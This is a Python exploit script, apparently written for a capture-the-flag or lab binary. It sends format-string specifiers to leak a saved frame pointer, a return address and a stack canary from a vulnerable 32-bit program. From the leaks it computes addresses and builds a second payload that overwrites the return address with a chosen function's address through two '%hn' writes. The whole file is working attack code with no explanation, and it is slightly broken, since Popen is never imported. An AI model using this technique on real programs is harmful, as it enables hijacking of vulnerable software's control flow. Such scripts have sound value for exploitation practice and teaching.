#!/usr/bin/env python3

import sys

def xxd(str):
    with Popen('xxd', stdin=PIPE) as p:
        p.stdin.write(bytes(str, 'utf-8'))

def to_le(num):
    return num.to_bytes(4, 'little')

esp_to_ebp = 74
esp_to_ret = esp_to_ebp + 1
esp_to_canary = esp_to_ebp - 3
esp_to_buf1 = 7
esp_to_buf2 = 39
main_ret_to_unavailable = -216
old_fb_to_vuln_ret = -12

format_string = ''
for i in [esp_to_ebp, esp_to_ret, esp_to_canary]:
    format_string += ' %{}$08x'.format(str(i))

print(bytes(format_string, 'utf-8'))

input = input().strip('\n').split(' ')
stack, code, canary = input
print(stack, code, canary)

stack_int = int(stack, 16)
ret_int = stack_int + old_fb_to_vuln_ret
ret1 = ret_int.to_bytes(4, 'little')
ret2 = (ret_int + 2).to_bytes(4, 'little')

code_int = int(code, 16)
func_addr = code_int + main_ret_to_unavailable
low_num = func_addr & 0xffff
high_num = (func_addr >> 16) & 0xffff
low = low_num.to_bytes(2, 'little')
high = high_num.to_bytes(2, 'little')
func_addr = low + high

high_num -= low_num
while(low_num < 8):
    low_num += 0x10000
while(high_num < 8):
    high_num += 0x10000

format_string = '%{}x%{}$hn%{}x%{}$hn'.format(low_num, esp_to_buf2, high_num, esp_to_buf2 + 1)

payload = ret1 + ret2
payload += bytes(format_string, 'utf-8')
print(payload)
